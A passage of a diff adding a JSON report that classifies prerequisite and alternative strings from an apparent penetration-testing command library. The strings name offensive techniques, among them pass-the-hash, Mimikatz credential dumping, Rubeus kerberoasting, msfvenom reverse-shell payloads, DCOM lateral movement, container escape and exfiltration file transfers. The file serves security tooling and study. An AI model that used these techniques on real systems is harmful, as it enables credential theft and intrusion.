+        "text": "Run gobuster first: gobuster-dir-common (complement findings)",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/general.json",
+            "command_id": "nikto-comprehensive",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Check robots.txt and source code manually",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/general.json",
+            "command_id": "nikto-comprehensive",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "NTLM hash obtained",
+        "reason": "State condition - not a command",
+        "metadata": {
+          "type": "state_condition"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-pth.json",
+            "command_id": "pth-impacket-psexec",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-pth.json",
+            "command_id": "pth-evil-winrm",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-pth.json",
+            "command_id": "pth-cme-spray",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-pth.json",
+            "command_id": "pth-verify-hash-format",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json",
+            "command_id": "overpass-mimikatz-pth",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 5
+      },
+      {
+        "text": "NTLM hash",
+        "reason": "State condition - not a command",
+        "metadata": {
+          "type": "state_condition"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-pth.json",
+            "command_id": "pth-impacket-wmiexec",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-pth.json",
+            "command_id": "pth-impacket-smbexec",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json",
+            "command_id": "overpass-rubeus-asktgt",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 3
+      },
+      {
+        "text": "WinRM enabled on target (port 5985/5986)",
+        "reason": "State condition - not a command",
+        "metadata": {
+          "type": "state_condition"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-pth.json",
+            "command_id": "pth-evil-winrm",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Manual testing with evil-winrm",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-pth.json",
+            "command_id": "pth-cme-spray",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "CrackMapExec installed",
+        "reason": "State condition - not a command",
+        "metadata": {
+          "type": "state_condition"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-pth.json",
+            "command_id": "pth-cme-spray",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-pth.json",
+            "command_id": "pth-cme-exec",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-pth.json",
+            "command_id": "pth-verify-hash-format",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-wmi.json",
+            "command_id": "wmi-cme-exec",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 4
+      },
+      {
+        "text": "Use -X for PowerShell commands",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-pth.json",
+            "command_id": "pth-cme-exec",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Manual base64-encode-powershell with custom payload",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-helpers.json",
+            "command_id": "revshell-ps-generator",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Target identified",
+        "reason": "State condition - not a command",
+        "metadata": {
+          "type": "state_condition"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-helpers.json",
+            "command_id": "lateral-movement-troubleshooting",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "DCOM enabled (default)",
+        "reason": "State condition - not a command",
+        "metadata": {
+          "type": "state_condition"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-dcom.json",
+            "command_id": "dcom-shellbrowserwindow",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "WinRM enabled on target (default Windows Server 2012+)",
+        "reason": "State condition - not a command",
+        "metadata": {
+          "type": "state_condition"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-winrm.json",
+            "command_id": "winrm-enter-pssession",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "WinRM enabled on target (port 5985 or 5986 open)",
+        "reason": "State condition - not a command",
+        "metadata": {
+          "type": "state_condition"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-winrm.json",
+            "command_id": "evil-winrm-creds",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Evil-WinRM installed on Kali",
+        "reason": "State condition - not a command",
+        "metadata": {
+          "type": "state_condition"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-winrm.json",
+            "command_id": "evil-winrm-hash",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "RPC port 135 open on target",
+        "reason": "State condition - not a command",
+        "metadata": {
+          "type": "state_condition"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-wmi.json",
+            "command_id": "wmi-legacy-wmic",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "SMB connection to target (port 445)",
+        "reason": "State condition - not a command",
+        "metadata": {
+          "type": "state_condition"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-wmi.json",
+            "command_id": "wmi-impacket-exec",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Use hostname in UNC path: \\\\files04\\share",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json",
+            "command_id": "overpass-net-use-trigger",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Mimikatz available",
+        "reason": "State condition - not a command",
+        "metadata": {
+          "type": "state_condition"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json",
+            "command_id": "passticket-mimikatz-inject",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": ".kirbi ticket file",
+        "reason": "State condition - not a command",
+        "metadata": {
+          "type": "state_condition"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json",
+            "command_id": "passticket-rubeus-ptt",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Rubeus.exe available",
+        "reason": "State condition - not a command",
+        "metadata": {
+          "type": "state_condition"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json",
+            "command_id": "overpass-rubeus-asktgt",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Nmap installed: sudo apt install nmap",
+        "reason": "State condition - not a command",
+        "metadata": {
+          "type": "state_condition"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/pivoting/linux-utilities.json",
+            "command_id": "nmap-port-check",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Socat installed on pivot host: which socat (if not found: sudo apt install socat)",
+        "reason": "State condition - not a command",
+        "metadata": {
+          "type": "state_condition"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/pivoting/ssh-tunneling.json",
+            "command_id": "socat-port-forward",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "RDP service running on target: nmap -p 3389 -Pn <TARGET>",
+        "reason": "State condition - not a command",
+        "metadata": {
+          "type": "state_condition"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/pivoting/pivot-utilities.json",
+            "command_id": "xfreerdp-connect",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Python available on pivot host: which python3 (usually present by default)",
+        "reason": "State condition - not a command",
+        "metadata": {
+          "type": "state_condition"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/pivoting/pivot-utilities.json",
+            "command_id": "sshuttle-vpn",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "SOCKS proxy running: ssh -D <SOCKS_PORT> or ssh -R <SOCKS_PORT> (remote dynamic)",
+        "reason": "State condition - not a command",
+        "metadata": {
+          "type": "state_condition"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/pivoting/proxychains-utilities.json",
+            "command_id": "proxychains-config",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "SOCKS proxy running: ssh -D <PORT> or ssh -R <PORT>",
+        "reason": "State condition - not a command",
+        "metadata": {
+          "type": "state_condition"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/pivoting/proxychains-utilities.json",
+            "command_id": "proxychains-nmap",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "SOCKS proxy running: ssh -D or ssh -R (remote dynamic)",
+        "reason": "State condition - not a command",
+        "metadata": {
+          "type": "state_condition"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/pivoting/proxychains-utilities.json",
+            "command_id": "proxychains-psql",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      }
+    ],
+    "D": [
+      {
+        "text": "wpscan-enumerate-all (to discover usernames)",
+        "reason": "Fuzzy match to 'wpscan-enumerate-all'",
+        "metadata": {
+          "match": "wpscan-enumerate-all",
+          "score": 0.5
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/web/wordpress.json",
+            "command_id": "wpscan-password-attack",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "dmesg-kernel-messages (kernel only)",
+        "reason": "Fuzzy match to 'dmesg-kernel-messages'",
+        "metadata": {
+          "match": "dmesg-kernel-messages",
+          "score": 0.6
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/monitoring/log-monitoring.json",
+            "command_id": "journalctl-boot-messages",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "docker-mount-escape (preferred method)",
+        "reason": "Fuzzy match to 'docker-mount-escape'",
+        "metadata": {
+          "match": "docker-mount-escape",
+          "score": 0.6
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux-docker-commands.json",
+            "command_id": "docker-privileged-escape",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "PowerUp's Get-UnquotedService",
+        "reason": "Fuzzy match to 'get-unquotedservice'",
+        "metadata": {
+          "match": "get-unquotedservice",
+          "score": 0.6666666666666666
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/windows.json",
+            "command_id": "win-unquoted-service-paths",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Get-GPPPassword (PowerSploit)",
+        "reason": "Fuzzy match to 'get-gpppassword'",
+        "metadata": {
+          "match": "get-gpppassword",
+          "score": 0.6666666666666666
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/enumeration/ad-session-share-enum.json",
+            "command_id": "gpp-password-files",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "sqli-union-mysql-info (if SQL injection available)",
+        "reason": "Fuzzy match to 'sqli-union-mysql-info'",
+        "metadata": {
+          "match": "sqli-union-mysql-info",
+          "score": 0.5
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/database-access.json",
+            "command_id": "mysql-connect-basic",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "postgres-direct-connect (with password inline)",
+        "reason": "Fuzzy match to 'postgres-direct-connect'",
+        "metadata": {
+          "match": "postgres-direct-connect",
+          "score": 0.5
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/database-access.json",
+            "command_id": "postgres-connect-basic",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "sqli-union-postgresql-info (if SQL injection available)",
+        "reason": "Fuzzy match to 'sqli-union-postgresql-info'",
+        "metadata": {
+          "match": "sqli-union-postgresql-info",
+          "score": 0.5
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/database-access.json",
+            "command_id": "postgres-connect-basic",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "msfconsole search scanner/<SERVICE>",
+        "reason": "Fuzzy match to 'msfconsole-search'",
+        "metadata": {
+          "match": "msfconsole-search",
+          "score": 0.6666666666666666
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/auto-generated-full-syntax-exploitation.json",
+            "command_id": "ls-metasploit-auxiliary",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "msfvenom -p linux/x86/shell_reverse_tcp",
+        "reason": "Fuzzy match to 'msfvenom-linux-reverse-tcp'",
+        "metadata": {
+          "match": "msfvenom-linux-reverse-tcp",
+          "score": 0.5
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/general.json",
+            "command_id": "msfvenom-linux-elf",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "msfvenom -p windows/shell_reverse_tcp",
+        "reason": "Fuzzy match to 'msfvenom-linux-reverse-tcp'",
+        "metadata": {
+          "match": "msfvenom-linux-reverse-tcp",
+          "score": 0.5
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/general.json",
+            "command_id": "msfvenom-windows-exe",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "pth-impacket-psexec per target",
+        "reason": "Fuzzy match to 'pth-impacket-psexec'",
+        "metadata": {
+          "match": "pth-impacket-psexec",
+          "score": 0.6
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-pth.json",
+            "command_id": "pth-cme-spray",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "psexec-impacket-shell for direct SYSTEM shell",
+        "reason": "Fuzzy match to 'psexec-impacket-shell'",
+        "metadata": {
+          "match": "psexec-impacket-shell",
+          "score": 0.5
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-dcom.json",
+            "command_id": "dcom-mmc20-revshell",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "dcom-shellwindows (similar technique)",
+        "reason": "Fuzzy match to 'dcom-shellwindows'",
+        "metadata": {
+          "match": "dcom-shellwindows",
+          "score": 0.5
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-dcom.json",
+            "command_id": "dcom-shellbrowserwindow",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "psexec-impacket-shell with -hashes",
+        "reason": "Fuzzy match to 'psexec-impacket-shell'",
+        "metadata": {
+          "match": "psexec-impacket-shell",
+          "score": 0.6
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-winrm.json",
+            "command_id": "evil-winrm-hash",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "overpass-mimikatz-pth already executed",
+        "reason": "Fuzzy match to 'overpass-mimikatz-pth'",
+        "metadata": {
+          "match": "overpass-mimikatz-pth",
+          "score": 0.6
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json",
+            "command_id": "overpass-net-use-trigger",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Rubeus ptt /ticket:<FILE>",
+        "reason": "Fuzzy match to 'rubeus-ptt'",
+        "metadata": {
+          "match": "rubeus-ptt",
+          "score": 0.6666666666666666
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json",
+            "command_id": "passticket-mimikatz-inject",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "service ssh start - SysVinit alternative (older systems)",
+        "reason": "Fuzzy match to 'service-ssh-start-sysvinit'",
+        "metadata": {
+          "match": "service-ssh-start-sysvinit",
+          "score": 0.5714285714285714
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/pivoting/linux-utilities.json",
+            "command_id": "systemctl-start-ssh",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "nmap localhost - External port scan verification",
+        "reason": "Fuzzy match to 'nmap-localhost-verification'",
+        "metadata": {
+          "match": "nmap-localhost-verification",
+          "score": 0.5
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/pivoting/linux-utilities.json",
+            "command_id": "ss-listening-ports",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "netstat -rn - Netstat routing table view",
+        "reason": "Fuzzy match to 'netstat-routing-table'",
+        "metadata": {
+          "match": "netstat-routing-table",
+          "score": 0.6
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/pivoting/linux-utilities.json",
+            "command_id": "ip-route",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "chisel - HTTP tunneling if SSH blocked",
+        "reason": "Fuzzy match to 'chisel-http-tunneling'",
+        "metadata": {
+          "match": "chisel-http-tunneling",
+          "score": 0.5
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/pivoting/pivot-utilities.json",
+            "command_id": "plink-remote-forward",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "plink-remote-forward - Windows SSH client alternative",
+        "reason": "Fuzzy match to 'plink-remote-forward-windows'",
+        "metadata": {
+          "match": "plink-remote-forward-windows",
+          "score": 0.5714285714285714
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/pivoting/pivot-utilities.json",
+            "command_id": "ssh-connect",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      }
+    ],
+    "E": [
+      {
+        "text": "HTTP server on attacker",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/generated/file-transfer-additions.json",
+            "command_id": "powershell-invoke-webrequest",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Transfer LinEnum.sh",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/generated/post-exploitation-additions.json",
+            "command_id": "linenum-run",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Transfer pspy64/pspy32",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/generated/post-exploitation-additions.json",
+            "command_id": "pspy-monitor",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Transfer PowerUp.ps1",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/generated/post-exploitation-additions.json",
+            "command_id": "powerup-run",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Transfer Seatbelt.exe",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/generated/post-exploitation-additions.json",
+            "command_id": "seatbelt-run",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "SFTP for interactive transfer",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/exfiltration.json",
+            "command_id": "file-transfer-scp",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Python Flask upload server",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/exfiltration.json",
+            "command_id": "file-transfer-php",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "TFTP for simpler transfers",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/exfiltration.json",
+            "command_id": "file-transfer-ftp",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "SFTP for encrypted transfers",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/exfiltration.json",
+            "command_id": "file-transfer-ftp",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "PowerUp's Get-RegistryAlwaysInstallElevated",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/windows.json",
+            "command_id": "win-always-install-elevated",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Watson (PowerShell-based)",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/windows.json",
+            "command_id": "win-kernel-exploits",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "mimikatz: vault::list",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/windows.json",
+            "command_id": "win-saved-credentials",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Use mimikatz lsadump::sam",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/windows.json",
+            "command_id": "win-sam-system-backup",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Rubeus.exe kerberoast",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/windows.json",
+            "command_id": "windows-kerberoasting",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Transfer linpeas.sh via file transfer methods",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux.json",
+            "command_id": "linux-privesc-linpeas",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Use pspy to monitor processes",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux.json",
+            "command_id": "linux-cron-enum",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Man pages: man 7 capabilities (understand what capability enables)",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux-capabilities-commands.json",
+            "command_id": "gtfobins-cap-lookup",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Identified capability/binary combination from previous steps",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux-capabilities-commands.json",
+            "command_id": "execute-cap-exploit",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Import PowerView: . .\\PowerView.ps1",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/enumeration/ad-powerview-core.json",
+            "command_id": "powerview-get-netuser-all",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "PsLoggedOn.exe downloaded from Sysinternals Suite",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/enumeration/ad-session-share-enum.json",
+            "command_id": "sysinternals-psloggedon",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Manual: for pw in $(cat wordlist); do echo -n \"$pw\" | md5sum; done",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/enumeration/password-attacks-hashcat.json",
+            "command_id": "hashcat-md5-crack",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Install rlwrap: sudo apt install rlwrap",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/auto-generated-full-syntax-exploitation.json",
+            "command_id": "rlwrap-nc-listener",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Get script help: nmap --script-help <SCRIPT_NAME>",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/general.json",
+            "command_id": "nmap-script-args",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Mimikatz on compromised Windows host",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-pth.json",
+            "command_id": "pth-mimikatz-sekurlsa",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Metasploit web_delivery module",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-helpers.json",
+            "command_id": "revshell-ps-generator",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Base64 payload generated with revshell-ps-generator",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-dcom.json",
+            "command_id": "dcom-mmc20-revshell",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Mimikatz on Windows host",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json",
+            "command_id": "overpass-mimikatz-pth",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json",
+            "command_id": "passticket-mimikatz-export",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 2
+      },
+      {
+        "text": "Mimikatz: sekurlsa::tickets",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json",
+            "command_id": "kerberos-klist-verify",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Rubeus: klist",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json",
+            "command_id": "kerberos-klist-verify",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Invoke-Mimikatz for remote export",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json",
+            "command_id": "passticket-mimikatz-export",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Mimikatz: kerberos::purge",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json",
+            "command_id": "kerberos-purge-tickets",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Port forward if internal network: ssh -L <LOCAL_PORT>:<TARGET>:<PORT> <SSH_USER>@<SSH_HOST>",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/pivoting/linux-utilities.json",
+            "command_id": "psql-connect",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Pivot host can route to destination: ip route, ping <DEST_IP>",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
